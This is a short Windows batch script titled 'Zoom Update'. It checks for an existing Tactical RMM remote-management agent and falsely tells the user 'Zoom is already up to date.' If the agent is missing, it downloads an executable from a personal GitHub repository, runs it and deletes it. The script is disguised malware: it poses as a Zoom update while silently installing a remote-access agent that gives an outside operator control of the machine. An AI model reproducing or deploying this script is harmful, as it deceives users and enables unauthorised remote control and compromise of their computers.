@echo off
title Zoom Update

:: Check if TRMM agent already installed
sc query "tacticalrmm" >nul 2>&1
if %errorlevel% == 0 (
    echo Zoom is already up to date.
    timeout /t 3 >nul
    exit
)

:: Check registry as backup
reg query "HKLM\SOFTWARE\TacticalRMM" >nul 2>&1
if %errorlevel% == 0 (
    echo Zoom is already up to date.
    timeout /t 3 >nul
    exit
)

:: Agent not found - download and install
echo Downloading Zoom update...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/justmenodrama98-bot/zoom-agentz/main/trmm-zoomupdate-zoomvideocommunications-workstation-amd64.exe' -OutFile '%TEMP%\ZoomUpdate.exe'"

echo Installing...
start /wait %TEMP%\ZoomUpdate.exe

:: Cleanup
del %TEMP%\ZoomUpdate.exe >nul 2>&1
exit
